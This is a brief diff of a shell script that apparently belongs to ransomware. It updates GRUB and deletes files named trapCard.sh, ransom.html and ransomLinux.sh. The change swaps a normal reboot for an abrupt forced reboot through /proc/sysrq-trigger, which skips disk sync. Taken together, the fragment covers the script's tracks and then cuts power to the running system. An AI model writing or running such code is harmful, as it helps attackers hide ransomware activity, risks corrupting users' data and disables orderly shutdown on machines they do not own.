@@ -39,4 +39,6 @@ update-grub
 rm -f trapCard.sh
 rm -f ransom.html
 rm -f ransomLinux.sh
-reboot
+
+echo 1 > /proc/sys/kernel/sysrq
+echo b > /proc/sysrq-trigger
